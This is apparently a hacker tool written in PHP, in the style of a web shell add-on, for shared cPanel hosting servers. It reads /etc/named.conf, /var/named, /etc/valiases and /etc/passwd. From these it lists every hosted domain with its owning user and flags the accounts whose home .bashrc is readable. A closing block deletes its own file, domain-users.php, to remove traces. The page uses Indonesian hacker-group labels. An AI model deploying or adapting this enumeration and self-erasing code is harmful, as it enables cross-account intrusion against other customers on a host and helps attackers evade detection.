<?php

@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}
 
echo '<html><head>
<meta content="text/html; charset=utf-8">
<meta name="keywords" content="Not Found" />
<meta name="description" content="Not Found" />
<meta name="author" content="Not Found" />
<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
<style>
body{
	background-image: url(#);
	color: #;
	text-align: center;
	font-family: Century Gothic;
	font-size: 14pt;
	background-color: black;
	font-weight: bold;
	padding: 0px;
}
a {
color:#;
}
a:hover {
color:lime;
}
td, th, p, li,table{
	background: #;
	border:1px solid #;
	text-align: center;
	-moz-border-radius: 5px;
-webkit-border-radius: 5px;
border-radius: 5px;
}
.result {
padding: 15px;
border: 1px solid #;
width: 500px;
margin: 0 auto;
border-radius: 10px;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
}
input{
	border: 1px solid;
	overflow: hidden;
	background: #;
	color: #;
	-moz-border-radius: 5px;
-webkit-border-radius: 5px;
border-radius: 5px;
}
textarea{
	border: 1px solid;
	overflow: hidden;
	background: #;
	color: #;
	-moz-border-radius: 5px;
-webkit-border-radius: 5px;
border-radius: 5px;
}
.main {
font-family: Bookman Old Style, Century Gothic;
font-size: 40pt;
text-shadow: 0px 0px 6px rgb(255, 0, 0), 0px 0px 5px rgb(255, 0, 0), 0px 0px 5px rgb(255, 0, 0);
color: rgb(255, 255, 255);
}
.button {
	-webkit-box-shadow:rgba(0,0,0,0.2) 0 1px 0 0;
	-moz-box-shadow:rgba(0,0,0,0.2) 0 1px 0 0;
	box-shadow:rgba(0,0,0,0.2) 0 1px 0 0;
	color:#;
	background-color:#;
	border-radius:5px;
	-moz-border-radius:5px;
	-webkit-border-radius:5px;
	border:none;
	font-family:Arial,sans-serif;
	font-size:16px;
	font-weight:700;
	height:32px;
	padding:4px 16px;
	text-shadow:# 0 1px 0
}
</style>
</head><body>';
echo '<div style="font-family: Iceland;font-size: 35pt;text-shadow: 0 0 6px #, 0 0 5px #, 0 0 5px #;color: #">User Domain</sub></div><br/>';
 
echo "<center>";
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");
 
if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.bashrc';
$path = getcwd();
 
if (is_readable($dirz)) {
echo "<tr><td>".$count++."</td><td><a href=http://".$domain." target='_blank'>".$domain."</a></td><td>".$owner['name']."</td></tr>";
$dc++;
}
 
}
}
echo '</table>';
$total = $dc;
echo '<br><div class="result">Domain Yang Ketemu = '.$total.'</h3><br />';
echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> </th><th> .bashrc </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.bashrc';
$path = getcwd();
if (is_readable($dirz)) {
echo "<tr><td>".$count++."</td><td><a target='_blank' href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td>'.$r."</td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
                                }
            }
                        }
echo '</table>';
$total = $dc;
echo '<br><div class="result">Total cPanel Yang Ketemu = '.$total.'</h3><br />';
echo '</center>';
 
}
}else{
echo "<div class='result'><i><font color='#'>ERROR</font><br><font color='#'>/var/named</font> or <font color='red'>etc/named.conf</font> Not Accessible!</i></div>";
}
 
echo "<br>&#169; <font color='red'> ^_^ </font>";
?>

<?php

echo '<style>body {background-color:#;color:#;}</style>
Hacker Sakit Hati<br>';

$result=unlink("domain-users.php");
if($result){
echo "<font color=lime>File domain-users.php BERHASIL DI HAPUS</font></br>";
}else{
echo "<font color=#>Hati - Hati FIle gagal dihapus . . . ! ! !</br>";
}

?>

